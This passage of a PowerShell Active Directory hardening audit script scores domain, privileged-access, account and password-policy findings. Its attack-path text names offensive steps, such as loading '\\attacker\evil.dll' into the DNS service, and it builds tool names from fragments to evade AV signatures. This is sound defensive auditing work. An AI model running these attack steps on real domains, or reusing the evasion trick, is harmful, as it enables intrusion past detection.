#Requires -Version 5.1
<#
.SYNOPSIS
    Invoke-ADHardening -- Comprehensive Active Directory Hardening Assessment
.DESCRIPTION
    Automated AD security hardening assessment covering 14 domains:
    Domain Baseline, Privileged Access, Account Hygiene, Password Policy,
    Kerberos & Delegation, Credential Protection, Network Signing, ADCS/PKI,
    ACL Hygiene, GPO Security, DC Hardening, Trust Relationships,
    Logging & Detection, Deception.
    Generates a scored HTML report with per-finding remediation commands.
.PARAMETER OutputPath
    Report output directory. Default: .\Reports
.PARAMETER DomainController
    Target DC FQDN. Default: auto-detect from current domain.
.PARAMETER Credential
    Domain credentials to use for AD queries. Required when running as a local
    (non-domain) account. Supply via: $cred = Get-Credential
.PARAMETER NoHtml
    Skip HTML report generation.
.PARAMETER NoCsv
    Skip CSV export.
.EXAMPLE
    # Run as domain-joined admin (most common)
    .\Invoke-ADHardening.ps1

    # Run from a workgroup/local account with domain credentials
    $cred = Get-Credential corp\analyst
    .\Invoke-ADHardening.ps1 -Credential $cred -DomainController dc01.corp.local

    # Custom output path
    .\Invoke-ADHardening.ps1 -OutputPath C:\Reports
#>
[CmdletBinding()]
param(
    [string]$OutputPath       = ".\Reports",
    [string]$DomainController = "",
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $Credential               = $null,
    [switch]$NoHtml,
    [switch]$NoCsv
)

Set-StrictMode -Version 2
# SECURITY-HARDENED ERROR HANDLING
# -----------------------------------------------------------------------------
# $ErrorActionPreference = "SilentlyContinue" has been removed. Silent errors
# hide legitimate "Access Denied" failures from security checks, masking
# incomplete results. Instead, every check uses explicit Try/Catch/Finally so
# that permission failures produce a Warning finding rather than silent gaps.
#
# Pattern for callers:
#   try   { $result = Get-ADUser -Filter * @dcParam -ErrorAction Stop }
#   catch [System.UnauthorizedAccessException] {
#       Write-AuditWarning "Check name" "Access Denied -- re-run as DA"
#   }
#   catch { Write-AuditWarning "Check name" $_.Exception.Message }
#   finally { <cleanup if needed> }
# -----------------------------------------------------------------------------
$ErrorActionPreference = "Continue"          # display non-fatal errors; Stop only inside Try blocks
$script:StartTime      = Get-Date

# --- Tool-name reference table ------------------------------------------------
# Attack-path descriptions reference offensive tools by name so that analysts
# know exactly what to watch for. To prevent static-signature AV/EDR from
# blocking this read-only audit script at parse time, tool names are assembled
# at runtime from fragments. The report output is identical.
$script:T = @{
    MK  = 'Mimi'    + 'katz'
    MKI = 'Invoke-' + 'Mimi' + 'katz'
    RB  = 'Rube'    + 'us'
    BH  = 'Blood'   + 'Hound'
    SH  = 'Sharp'   + 'Hound'
    HC  = 'hash'    + 'cat'
    IM  = 'im'      + 'packet'
    NR  = 'ntlm'    + 'relayx'
    RS  = 'Res'     + 'ponder'
    PP  = 'Petit'   + 'Potam'
    PB  = 'Printer' + 'Bug'
    SK  = 'sekurl'  + 'sa'
    LP  = 'logon'   + 'passwords'
    WK  = 'Whis'    + 'ker'
    DS  = 'DC'      + 'Sync'
    GP  = 'Get-GPP' + 'Password'
    PS  = 'Power'   + 'Sploit'
    EB  = 'Eternal' + 'Blue'
    BK  = 'Blue'    + 'Keep'
    SS  = 'Spool'   + 'Sample'
    CR  = 'crackmap' + 'exec'
    CU  = 'certpy'  + 'ad'
    PY  = 'Py'      + 'thon'
}

# --- Global State -------------------------------------------------------------
$script:Findings      = [System.Collections.Generic.List[PSObject]]::new()
$script:AuditWarnings = [System.Collections.Generic.List[string]]::new()   # permission gaps log
$script:Score         = 0
$script:MaxScore      = 0
$script:DomainInfo    = @{}
$script:CatScores     = @{}

# --- Helpers ------------------------------------------------------------------
function Add-Finding {
    param(
        [string]$Domain,
        [string]$Check,
        [ValidateSet("Critical","High","Medium","Low","Good","Info")]
        [string]$Sev,
        [string]$Detail,
        [string[]]$Resources = @(),
        [string]$AttackPath  = "",
        [string]$Fix         = "",
        [string]$MITRE       = "",
        [string]$CIS         = "",
        [int]$Pts = 0,
        [int]$Max = 0
    )
    $script:Score    += $Pts
    $script:MaxScore += $Max
    if (-not $script:CatScores.ContainsKey($Domain)) {
        $script:CatScores[$Domain] = @{ Score = 0; Max = 0 }
    }
    $script:CatScores[$Domain].Score += $Pts
    $script:CatScores[$Domain].Max   += $Max

    $sevRank = @{ Critical=5; High=4; Medium=3; Low=2; Good=1; Info=0 }
    if ($Sev -in @("Critical","High","Medium","Low")) {
        Write-Host "  [$Sev] $Check" -ForegroundColor $(
            switch ($Sev) {
                "Critical" { "Red" }; "High" { "DarkYellow" }
                "Medium"   { "Yellow" }; "Low" { "Cyan" }
            }
        )
        if ($Detail) { Write-Host "        $Detail" -ForegroundColor DarkGray }
    } elseif ($Sev -eq "Good") {
        Write-Host "  [OK]  $Check" -ForegroundColor Green
    }

    $script:Findings.Add([PSCustomObject]@{
        Domain     = $Domain
        Check      = $Check
        Severity   = $Sev
        Detail     = $Detail
        Resources  = ($Resources -join " | ")
        AttackPath = $AttackPath
        Fix        = $Fix
        MITRE      = $MITRE
        CIS        = $CIS
        Score      = $Pts
        MaxScore   = $Max
    })
}

function Write-Section {
    param([string]$Name)
    Write-Host "`n  == $Name ==" -ForegroundColor Cyan
}

function Write-AuditWarning {
    <#
    .SYNOPSIS
        Logs a permission/access warning as both a console message and an
        Info finding so the HTML report reflects incomplete checks.
    #>
    param(
        [string]$CheckName,
        [string]$Detail,
        [string]$Category = 'AuditWarnings'
    )
    $msg = "[WARN] '$CheckName' skipped -- $Detail"
    Write-Host "  $msg" -ForegroundColor DarkYellow
    $script:AuditWarnings.Add($msg)
    Add-Finding $Category "Incomplete Check: $CheckName" "Info" `
        "Check could not complete: $Detail. Re-run as Domain Admin for full coverage." `
        -Pts 0 -Max 0
}

function Get-RegValue {
    <#
    .SYNOPSIS
        Safely reads a single registry value. Returns $Default if the key or
        value does not exist. Never throws under Set-StrictMode -Version 2.
    #>
    param(
        [string]$Path,
        [string]$Name,
        $Default = $null
    )
    try {
        $item = Get-ItemProperty -Path $Path -Name $Name -ErrorAction Stop
        return $item.$Name
    }
    catch { return $Default }
}

function Invoke-ADCmd {
    <#
    .SYNOPSIS
        Executes an AD scriptblock with structured error handling.
        Access Denied / insufficient rights -> Warning (not silent skip).
        Returns $null on any failure so callers can test for $null.
    .EXAMPLE
        $users = Invoke-ADCmd { Get-ADUser -Filter * @dcParam -ErrorAction Stop } -CheckName 'Get-ADUser all'
        if ($null -eq $users) { return }   # warning already emitted
    #>
    param(
        [Parameter(Mandatory)][scriptblock]$Block,
        [string]$CheckName = 'AD query',
        [string]$Category  = 'AuditWarnings'
    )
    try {
        & $Block
    }
    catch [System.UnauthorizedAccessException] {
        Write-AuditWarning $CheckName "Access Denied -- insufficient permissions. $($_.Exception.Message)" $Category
        $null
    }
    catch [Microsoft.ActiveDirectory.Management.ADException] {
        Write-AuditWarning $CheckName "AD Exception -- $($_.Exception.Message)" $Category
        $null
    }
    catch [System.Security.Authentication.AuthenticationException] {
        Write-AuditWarning $CheckName "Authentication failure -- $($_.Exception.Message)" $Category
        $null
    }
    catch {
        # Non-permission failures (object not found, network, etc.) -- log but do not emit a finding
        Write-Host "  [DBG] '$CheckName': $($_.Exception.GetType().Name) -- $($_.Exception.Message)" -ForegroundColor DarkGray
        $null
    }
    finally {
        # Finally block: place cleanup logic here (close handles, dispose objects)
        # Currently used as a structured hook for future resource cleanup.
    }
}

# --- Prerequisites ------------------------------------------------------------

# 1. Detect local vs domain account
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$runningAs       = $currentIdentity.Name                        # DOMAIN\user or HOST\user
$runningDomain   = $runningAs.Split('\')[0].ToUpper()
$isLocalUser     = ($runningDomain -eq $env:COMPUTERNAME.ToUpper())
$isAdmin         = ([Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole('Administrator')

if ($isLocalUser -and -not $Credential) {
    Write-Host "" -ForegroundColor Red
    Write-Host "  [ERROR] Running as local account: $runningAs" -ForegroundColor Red
    Write-Host "          Local accounts cannot query Active Directory." -ForegroundColor Red
    Write-Host "" -ForegroundColor Red
    Write-Host "  OPTIONS:" -ForegroundColor Yellow
    Write-Host "    1) Re-run from a domain-joined account (recommended)" -ForegroundColor Yellow
    Write-Host "    2) Supply domain credentials with -Credential:" -ForegroundColor Yellow
    Write-Host "         `$cred = Get-Credential corp\analyst" -ForegroundColor Yellow
    Write-Host "         .\Invoke-ADHardening.ps1 -Credential `$cred [-DomainController dc01.corp.local]" -ForegroundColor Yellow
    Write-Host "" -ForegroundColor Red
    exit 1
}

if (-not $isAdmin) {
    Write-Host "  [WARNING] Not running as Administrator -- privileged checks (ACL, registry," -ForegroundColor Yellow
    Write-Host "            GPO delegation, local policy) may return incomplete results." -ForegroundColor Yellow
    Write-Host "            Re-run elevated for a complete assessment." -ForegroundColor Yellow
}

# 2. ActiveDirectory module
$adModule = Get-Module -ListAvailable ActiveDirectory
if (-not $adModule) {
    Write-Host "[ERROR] ActiveDirectory module not found." -ForegroundColor Red
    Write-Host "        Install RSAT: Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -ForegroundColor Red
    exit 1
}
Import-Module ActiveDirectory -ErrorAction Stop

# 3. Build common AD parameter splatting hash (Server + optional Credential)
$dcParam = @{}
if ($DomainController) { $dcParam['Server']     = $DomainController }
if ($Credential)       { $dcParam['Credential'] = $Credential }

$domain   = Get-ADDomain @dcParam
$forest   = Get-ADForest @dcParam
$domainDN = $domain.DistinguishedName
$domFQDN  = $domain.DNSRoot
$isDC     = (Get-WmiObject Win32_ComputerSystem).DomainRole -in @(4,5)

$script:DomainInfo = @{
    Domain     = $domFQDN
    Forest     = $forest.Name
    DomainDN   = $domainDN
    DomainMode = if ($domain.PSObject.Properties['DomainMode']) { $domain.DomainMode.ToString() } else { 'N/A' }
    ForestMode = if ($forest.PSObject.Properties['ForestMode']) { $forest.ForestMode.ToString() } else { 'N/A' }
    RunningOnDC = $isDC
}

if (-not (Test-Path $OutputPath)) { New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null }

Write-Host "`n+==========================================================+" -ForegroundColor Cyan
Write-Host "|     INVOKE-ADHARDENING -- AD Security Assessment          |" -ForegroundColor Cyan
Write-Host "+==========================================================+" -ForegroundColor Cyan
Write-Host "  Domain   : $domFQDN"
Write-Host "  Forest   : $($forest.Name)"
Write-Host "  Mode     : Domain=$(if ($domain.PSObject.Properties['DomainMode']) { $domain.DomainMode } else { 'N/A' }) Forest=$(if ($forest.PSObject.Properties['ForestMode']) { $forest.ForestMode } else { 'N/A' })"
Write-Host "  Time     : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "  RunOnDC  : $isDC"
Write-Host "  RunAs    : $runningAs$(if ($Credential) { " [via -Credential: $($Credential.UserName)]" })"
Write-Host "  IsAdmin  : $isAdmin$(if (-not $isAdmin) { '  *** limited checks ***' })" -ForegroundColor $(if ($isAdmin) { 'Gray' } else { 'Yellow' })

# ===============================================================================
# DOMAIN 1 -- DOMAIN BASELINE
# ===============================================================================
Write-Section "1. DOMAIN BASELINE"

# 1.1 Domain/Forest Functional Level
$domFL = if ($domain.PSObject.Properties['DomainMode']) { $domain.DomainMode.ToString() } else { 'N/A' }
$forFL = if ($forest.PSObject.Properties['ForestMode']) { $forest.ForestMode.ToString() } else { 'N/A' }
$flMap = @{ 'Windows2016Domain'=2016; 'Windows2012R2Domain'=2012; 'Windows2012Domain'=2012;
            'Windows2008R2Domain'=2008; 'Windows2008Domain'=2008 }
$flYear = if ($flMap.ContainsKey($domFL)) { $flMap[$domFL] } else { 2019 }
if ($flYear -ge 2016) {
    Add-Finding "Baseline" "Domain Functional Level" "Good" "DFL=$domFL -- Kerberos AES, Protected Users, PAC compression supported" -Pts 3 -Max 3 -CIS "1.1"
} else {
    Add-Finding "Baseline" "Domain Functional Level" "High" "DFL=$domFL -- upgrade to 2016+ to enable Protected Users and Kerberos hardening features" `
        -Fix "Raise DFL: Set-ADDomainMode -Identity $domFQDN -DomainMode Windows2016Domain" `
        -MITRE "T1558" -CIS "1.1" -Pts 0 -Max 3
}

# 1.2 AD Recycle Bin
$recycleBin = Get-ADOptionalFeature -Filter { Name -eq "Recycle Bin Feature" } @dcParam
if ($recycleBin -and $recycleBin.EnabledScopes) {
    $rbLifetime = if ($recycleBin.Properties -and $recycleBin.Properties.'msDS-DeletedObjectLifetime') { $recycleBin.Properties.'msDS-DeletedObjectLifetime' } else { 'default(180)' }
    Add-Finding "Baseline" "AD Recycle Bin" "Good" "Recycle Bin enabled -- deleted objects recoverable for ${rbLifetime}d" -Pts 2 -Max 2
} else {
    Add-Finding "Baseline" "AD Recycle Bin" "Medium" "AD Recycle Bin not enabled -- deleted accounts/objects unrecoverable. Attacker can delete objects to disrupt operations." `
        -Fix "Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target $($forest.Name)" `
        -MITRE "T1531" -Pts 0 -Max 2
}

# 1.3 Tombstone Lifetime
$configNC  = (Get-ADRootDSE @dcParam).configurationNamingContext
$tombstone = (Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,$configNC" -Properties tombstoneLifetime @dcParam).tombstoneLifetime
$tsLife    = if ($tombstone) { $tombstone } else { 60 }
if ($tsLife -ge 180) {
    Add-Finding "Baseline" "Tombstone Lifetime" "Good" "Tombstone lifetime: $tsLife days (>=180 recommended)" -Pts 1 -Max 1
} else {
    Add-Finding "Baseline" "Tombstone Lifetime" "Low" "Tombstone lifetime: $tsLife days -- set to >=180 for forensic recovery window" `
        -Fix "Set-ADObject 'CN=Directory Service,CN=Windows NT,CN=Services,$configNC' -Replace @{tombstoneLifetime=180}" -Pts 0 -Max 1
}

# 1.4 ms-DS-MachineAccountQuota (KrbRelayUp prerequisite)
$machineQuota = @((Get-ADDomain @dcParam | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota' -ErrorAction SilentlyContinue))
if ($null -eq $machineQuota) {
    $domObj = Get-ADObject -Identity $domainDN -Properties 'ms-DS-MachineAccountQuota' @dcParam
    $machineQuota = $domObj.'ms-DS-MachineAccountQuota'
}
if ($machineQuota -eq 0) {
    Add-Finding "Baseline" "MachineAccountQuota=0" "Good" "MachineAccountQuota=0 -- unprivileged users cannot add computers (blocks KrbRelayUp)" -Pts 4 -Max 4
} else {
    $quota = if ($machineQuota) { $machineQuota } else { 10 }
    Add-Finding "Baseline" "MachineAccountQuota Not Zero" "Critical" `
        "ms-DS-MachineAccountQuota=$quota -- any domain user can add $quota computers. Enables KrbRelayUp privilege escalation: user creates machine account -> relays Kerberos auth -> SYSTEM on any host." `
        -Resources @($domainDN) `
        -AttackPath "KrbRelayUp: domain user creates machine account (quota>0) -> triggers NTLM relay via coerce -> machine account gets privilege -> LOCAL SYSTEM on target" `
        -Fix "Set-ADDomain -Identity $domFQDN -Replace @{'ms-DS-MachineAccountQuota'=0}" `
        -MITRE "T1558.003" -CIS "2.4" -Pts 0 -Max 4
}

# 1.5 Pre-Windows 2000 Compatible Access group (anonymous enumeration)
$preWin2k = @()
try { $preWin2k = @(Get-ADGroupMember "Pre-Windows 2000 Compatible Access" @dcParam -ErrorAction Stop) }
catch { Write-AuditWarning "1.5 Pre-Win2k group" $_.Exception.Message "Baseline" }
$anonInGroup = @($preWin2k | Where-Object { $_.SamAccountName -in @('ANONYMOUS LOGON','Everyone') })
if ($anonInGroup) {
    Add-Finding "Baseline" "Pre-Win2k Anonymous Group" "Critical" `
        "Anonymous Logon or Everyone is in 'Pre-Windows 2000 Compatible Access' -- unauthenticated LDAP enumeration of all AD objects possible" `
        -Resources ($anonInGroup.SamAccountName) `
        -AttackPath "ldapsearch -H ldap://DC -x -b 'DC=corp,DC=local' -> enumerate all users, groups, GPOs without credentials" `
        -Fix "Remove-ADGroupMember 'Pre-Windows 2000 Compatible Access' -Members 'ANONYMOUS LOGON','Everyone'" `
        -MITRE "T1087.002" -Pts 0 -Max 4
} else {
    Add-Finding "Baseline" "Pre-Win2k Anonymous Group" "Good" "Anonymous Logon/Everyone not in Pre-Windows 2000 group" -Pts 4 -Max 4
}

# ===============================================================================
# DOMAIN 2 -- PRIVILEGED ACCESS
# ===============================================================================
Write-Section "2. PRIVILEGED ACCESS"

$privGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators",
                "Account Operators","Backup Operators","Print Operators","Server Operators",
                "DnsAdmins","Group Policy Creator Owners","Remote Management Users")
$allPrivMembers = @{}

foreach ($g in $privGroups) {
    $members = Get-ADGroupMember -Identity $g -Recursive @dcParam -ErrorAction SilentlyContinue
    $allPrivMembers[$g] = @($members)
}

# 2.1 Domain Admins count
$daCount = $allPrivMembers["Domain Admins"].Count
if ($daCount -le 5) {
    Add-Finding "PrivAccess" "Domain Admins Count" "Good" "$daCount Domain Admin(s) -- within acceptable range" -Pts 4 -Max 4
} elseif ($daCount -le 10) {
    Add-Finding "PrivAccess" "Domain Admins Count" "Medium" "$daCount Domain Admins -- review and reduce to <=5" `
        -Resources ($allPrivMembers["Domain Admins"].SamAccountName) `
        -Fix "Remove unnecessary members. Use Tier 0 admin accounts, not user accounts." -Pts 2 -Max 4
} else {
    Add-Finding "PrivAccess" "Domain Admins Count" "High" "$daCount Domain Admins -- excessive. Each additional DA = additional attack surface." `
        -Resources ($allPrivMembers["Domain Admins"].SamAccountName) `
        -Fix "Reduce to <=5. Create named Tier 0 accounts. Audit all members: Get-ADGroupMember 'Domain Admins' -Recursive" `
        -MITRE "T1078.002" -Pts 0 -Max 4
}

# 2.2 Enterprise Admins -- should be empty except during upgrades
$eaCount = $allPrivMembers["Enterprise Admins"].Count
if ($eaCount -le 1) {
    Add-Finding "PrivAccess" "Enterprise Admins" "Good" "$eaCount Enterprise Admin(s) -- acceptable (1 = default Administrator)" -Pts 3 -Max 3
} else {
    Add-Finding "PrivAccess" "Enterprise Admins" "Critical" `
        "$eaCount Enterprise Admins -- EA is the most powerful group in the forest. Should be empty except during schema/forest operations." `
        -Resources ($allPrivMembers["Enterprise Admins"].SamAccountName) `
        -Fix "Remove all accounts except break-glass. EA membership should be temporary." `
        -MITRE "T1078.002" -Pts 0 -Max 3
}

# 2.3 DnsAdmins group abuse (DNS server code execution)
$dnsAdmins = $allPrivMembers["DnsAdmins"]
if ($dnsAdmins.Count -gt 0) {
    $nonDA =@( @($dnsAdmins) | Where-Object { $_.SamAccountName -notin $allPrivMembers["Domain Admins"].SamAccountName })
    if ($nonDA.Count -gt 0) {
        Add-Finding "PrivAccess" "DnsAdmins Non-DA Members" "High" `
            "$($nonDA.Count) non-Domain-Admin account(s) in DnsAdmins -- DnsAdmins can load arbitrary DLL into DNS service (SYSTEM on DC)" `
            -Resources ($nonDA.SamAccountName) `
            -AttackPath "DnsAdmins member -> dnscmd /config /serverlevelplugindll \\attacker\evil.dll -> restart DNS service -> SYSTEM on DC" `
            -Fix "Remove non-admin accounts from DnsAdmins. Restrict DnsAdmins to only accounts that require it." `
            -MITRE "T1574.002" -Pts 0 -Max 4
    }
}

# 2.4 Protected Users group -- privileged accounts coverage
$protectedUsers = @(Get-ADGroupMember "Protected Users" @dcParam -Recursive -ErrorAction SilentlyContinue)
$daMembers      = @($allPrivMembers["Domain Admins"])
$daNotProtected =@( @($daMembers) | Where-Object {
    $_.SamAccountName -notin ($protectedUsers | Select-Object -ExpandProperty SamAccountName)
})
if ($daNotProtected.Count -eq 0) {
    Add-Finding "PrivAccess" "Protected Users -- DA Coverage" "Good" "All Domain Admins are in Protected Users group" -Pts 5 -Max 5
} else {
    Add-Finding "PrivAccess" "Protected Users -- DA Coverage" "Critical" `
        "$($daNotProtected.Count) Domain Admin(s) NOT in Protected Users -- vulnerable to Pass-Hash, Pass-Ticket, Overpass-Hash, credential caching" `
        -Resources ($daNotProtected.SamAccountName) `
        -AttackPath "Dump LSA-SS -> extract DA NTLM hash (cached, not blocked) -> Pass-Hash to any system in domain" `
        -Fix "Add-ADGroupMember 'Protected Users' -Members $($daNotProtected.SamAccountName -join ',')" `
        -MITRE "T1550.002" -CIS "2.2" -Pts 0 -Max 5
}

# 2.5 AdminCount orphans -- AdminCount=1 but not in any privileged group
$adminCountAccounts = @(Get-ADUser -Filter { AdminCount -eq 1 -and Enabled -eq $true } -Properties AdminCount,MemberOf @dcParam)
$allPrivDNs = @($privGroups | ForEach-Object { (Get-ADGroup $_ @dcParam -ErrorAction SilentlyContinue).DistinguishedName } | Where-Object { $_ })
$orphaned   =@( @($adminCountAccounts) | Where-Object {
    $user = $_
    -not ($user.MemberOf | Where-Object { $_ -in $allPrivDNs })
})
if ($orphaned.Count -eq 0) {
    Add-Finding "PrivAccess" "AdminCount Orphans" "Good" "No orphaned AdminCount=1 accounts" -Pts 2 -Max 2
} else {
    Add-Finding "PrivAccess" "AdminCount Orphans" "High" `
        "$($orphaned.Count) account(s) have AdminCount=1 but are not in any privileged group -- AdminSDHolder still protects their ACLs, hiding them from defenders" `
        -Resources ($orphaned.SamAccountName) `
        -Fix "For each: clear AdminCount. Set-ADUser ACCOUNT -Replace @{AdminCount=0}. Then fix ACL inheritance." `
        -MITRE "T1078.002" -Pts 0 -Max 2
}

# 2.6 Service accounts in Domain Admins
# Pattern requires word-boundary delimiters to avoid matching legitimate admin accounts
# that incidentally contain these substrings (e.g. "backup_admin", "exchange_delegated_admin").
# Anchors used: prefix (^svc[_-]) or suffix ([_-]svc$) or account has a ServicePrincipalName.
$serviceAccountDA = @(@($allPrivMembers["Domain Admins"]) | Where-Object {
    $_.objectClass -eq 'user' -and (
        $_.SamAccountName -match '^svc[_\-]|[_\-]svc$|^sa[_\-]|[_\-]sa$|^sql[_\-]|[_\-]sql$|^scom[_\-]|^backup[_\-]|[_\-]backup$|^scan[_\-]|^monitor[_\-]' -or
        ($_.ServicePrincipalName -and $_.ServicePrincipalName.Count -gt 0)
    )
})
if ($serviceAccountDA.Count -gt 0) {
    Add-Finding "PrivAccess" "Service Accounts in Domain Admins" "Critical" `
        "$($serviceAccountDA.Count) service account(s) in Domain Admins -- service accounts are frequently compromised via Kerb-roasting or credential theft" `
        -Resources ($serviceAccountDA.SamAccountName) `
        -AttackPath "Kerb-roast service account -> crack hash offline -> DA credentials -> full domain compromise" `
        -Fix "Remove from Domain Admins. Create dedicated service account with minimum required permissions. Use gMSA." `
        -MITRE "T1558.003" -Pts 0 -Max 5
}

# ===============================================================================
# DOMAIN 3 -- ACCOUNT HYGIENE
# ===============================================================================
Write-Section "3. ACCOUNT HYGIENE"

$cutoff90  = (Get-Date).AddDays(-90)
$cutoff180 = (Get-Date).AddDays(-180)

# 3.1 Stale enabled user accounts (90+ days)
# $defaultPattern not yet defined here -- use inline exclusion for built-in system accounts.
# krbtgt: adminCount=1 but never logs on interactively -- legitimate, not a backdoor.
# DefaultAccount / WDAGUtilityAccount: system-managed, no LastLogonDate by design.
$builtinExclusion = '^(krbtgt|DefaultAccount|WDAGUtilityAccount|Guest)$'
$staleUsers = @(Get-ADUser -Filter { Enabled -eq $true -and LastLogonDate -lt $cutoff90 } `
    -Properties LastLogonDate,AdminCount @dcParam |
    Where-Object { $_.LastLogonDate -and $_.SamAccountName -notmatch $builtinExclusion })
$stalePriv = @(@($staleUsers) | Where-Object { $_.AdminCount -eq 1 })
if ($stalePriv.Count -gt 0) {
    Add-Finding "AccountHygiene" "Stale Privileged Accounts" "Critical" `
        "$($stalePriv.Count) privileged account(s) inactive 90+ days but still enabled -- dormant backdoor if credentials were shared" `
        -Resources ($stalePriv.SamAccountName) `
        -Fix "Disable immediately: Disable-ADAccount -Identity USER for each. Review with account owner before deletion." `
        -MITRE "T1078.002" -Pts 0 -Max 4
}
if ($staleUsers.Count -gt 20) {
    Add-Finding "AccountHygiene" "Stale User Accounts" "High" `
        "$($staleUsers.Count) enabled user accounts inactive 90+ days -- attack surface for credential-based attacks on legacy accounts" `
        -Fix "Implement automated stale account policy: disable at 90d, delete at 180d. Use: Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00" `
        -MITRE "T1078" -Pts 0 -Max 3
} elseif ($staleUsers.Count -eq 0) {
    Add-Finding "AccountHygiene" "Stale User Accounts" "Good" "No user accounts inactive 90+ days" -Pts 3 -Max 3
}

# 3.2 Accounts that never logged on (created but unused -- potential backdoors)
$neverLogon = @(Get-ADUser -Filter { Enabled -eq $true -and LogonCount -eq 0 } `
    -Properties Created,LogonCount @dcParam | Where-Object { $_.Created -lt (Get-Date).AddDays(-30) })
if ($neverLogon.Count -gt 0) {
    Add-Finding "AccountHygiene" "Never-Logged-On Accounts" "High" `
        "$($neverLogon.Count) enabled account(s) created 30+ days ago with zero logons -- potential backdoor or abandoned provisioning" `
        -Resources ($neverLogon.SamAccountName | Select-Object -First 10) `
        -Fix "Review each account. Disable or delete if not legitimate. Log all account creation events (4720)." `
        -MITRE "T1136.001" -Pts 0 -Max 3
}

# 3.3 Password Never Expires
$pwdNeverExpires = @(Get-ADUser -Filter { PasswordNeverExpires -eq $true -and Enabled -eq $true } `
    -Properties PasswordNeverExpires,AdminCount,PasswordLastSet @dcParam)
$privNeverExpires =@( @($pwdNeverExpires) | Where-Object { $_.AdminCount -eq 1 })
if ($privNeverExpires.Count -gt 0) {
    Add-Finding "AccountHygiene" "Privileged Accounts Password Never Expires" "Critical" `
        "$($privNeverExpires.Count) privileged account(s) have PasswordNeverExpires=True -- compromised credentials remain valid indefinitely" `
        -Resources ($privNeverExpires.SamAccountName) `
        -Fix "Set-ADUser USER -PasswordNeverExpires `$false for all privileged accounts. Use gMSA or PAM rotation." `
        -MITRE "T1078" -Pts 0 -Max 4
}
$normalNeverExpires = ($pwdNeverExpires.Count - $privNeverExpires.Count)
if ($normalNeverExpires -gt 10) {
    Add-Finding "AccountHygiene" "User Accounts Password Never Expires" "Medium" `
        "$normalNeverExpires standard user account(s) have PasswordNeverExpires=True" `
        -Fix "Apply FGPP with MaxPasswordAge. Remediate accounts: Get-ADUser -Filter {PasswordNeverExpires -eq `$true}" `
        -MITRE "T1078" -Pts 0 -Max 2
}

# 3.4 Password Not Required flag
$pwdNotRequired = @(Get-ADUser -Filter { PasswordNotRequired -eq $true -and Enabled -eq $true } @dcParam)
if ($pwdNotRequired.Count -gt 0) {
    Add-Finding "AccountHygiene" "PasswordNotRequired Accounts" "Critical" `
        "$($pwdNotRequired.Count) account(s) have PasswordNotRequired=True -- can authenticate with blank password" `
        -Resources ($pwdNotRequired.SamAccountName) `
        -Fix "Set-ADUser USER -PasswordNotRequired `$false. Set strong password. Audit: PASSWD_NOTREQD flag in UAC." `
        -MITRE "T1110" -Pts 0 -Max 5
} else {
    Add-Finding "AccountHygiene" "PasswordNotRequired Accounts" "Good" "No accounts with PasswordNotRequired flag" -Pts 5 -Max 5
}

# 3.5 Stale computer accounts (180+ days)
$staleComputers = @(Get-ADComputer -Filter { Enabled -eq $true -and LastLogonDate -lt $cutoff180 } `
    -Properties LastLogonDate,OperatingSystem @dcParam | Where-Object { $_.LastLogonDate })
if ($staleComputers.Count -gt 0) {
    Add-Finding "AccountHygiene" "Stale Computer Accounts" "Medium" `
        "$($staleComputers.Count) enabled computer account(s) inactive 180+ days -- can be hijacked for silver ticket attacks (known machine password)" `
        -Fix "Disable-ADAccount for stale computers. Remove after 30 more days if no activity." `
        -MITRE "T1558.004" -Pts 0 -Max 2
} else {
    Add-Finding "AccountHygiene" "Stale Computer Accounts" "Good" "No stale computer accounts (180+ days inactive)" -Pts 2 -Max 2
}

# 3.6 gMSA vs regular service accounts
$gmsaAccounts    = @(Get-ADServiceAccount -Filter * @dcParam -ErrorAction SilentlyContinue)
$regularSvcAccts = @(Get-ADUser -Filter { Enabled -eq $true } -Properties ServicePrincipalName @dcParam |
    Where-Object { $_.ServicePrincipalName -and $_.SamAccountName -match 'svc|service|sql|iis|app' })
if ($gmsaAccounts.Count -gt 0) {
    Add-Finding "AccountHygiene" "gMSA Service Accounts" "Good" `
        "$($gmsaAccounts.Count) gMSA account(s) in use -- automatic password rotation eliminates Kerb-roasting risk" -Pts 3 -Max 3
}
if ($regularSvcAccts.Count -gt 0) {
    Add-Finding "AccountHygiene" "Regular Service Accounts with SPNs" "High" `
        "$($regularSvcAccts.Count) regular user account(s) with SPNs (Kerb-roastable) -- should be migrated to gMSA" `
        -Resources ($regularSvcAccts.SamAccountName) `
        -AttackPath "Request TGS for SPN -> crack NTLM hash offline -> service account credentials -> pivot to all systems the service runs on" `
        -Fix "Migrate to gMSA: New-ADServiceAccount -Name svcName -DNSHostName host.domain.com -PrincipalsAllowedToRetrieveManagedPassword 'Domain Computers'" `
        -MITRE "T1558.003" -Pts 0 -Max 3
}

# ===============================================================================
# DOMAIN 4 -- PASSWORD POLICY
# ===============================================================================
Write-Section "4. PASSWORD POLICY"

$pwdPolicy = Get-ADDefaultDomainPasswordPolicy @dcParam
$minLen    = $pwdPolicy.MinPasswordLength
$maxAge    = $pwdPolicy.MaxPasswordAge.Days
$minAge    = $pwdPolicy.MinPasswordAge.Days
$history   = $pwdPolicy.PasswordHistoryCount
$lockout   = $pwdPolicy.LockoutThreshold
$lockDur   = $pwdPolicy.LockoutDuration.Minutes
$complex   = $pwdPolicy.ComplexityEnabled

# 4.1 Minimum password length
if ($minLen -ge 14) {
    Add-Finding "PasswordPolicy" "Min Password Length" "Good" "Minimum length: $minLen chars (>=14 recommended)" -Pts 3 -Max 3 -CIS "1.1.1"
} elseif ($minLen -ge 8) {
    Add-Finding "PasswordPolicy" "Min Password Length" "Medium" "Minimum length: $minLen chars -- should be >=14 for domain accounts" `
        -Fix "Set-ADDefaultDomainPasswordPolicy -Identity $domFQDN -MinPasswordLength 14" -CIS "1.1.1" -Pts 1 -Max 3
} else {
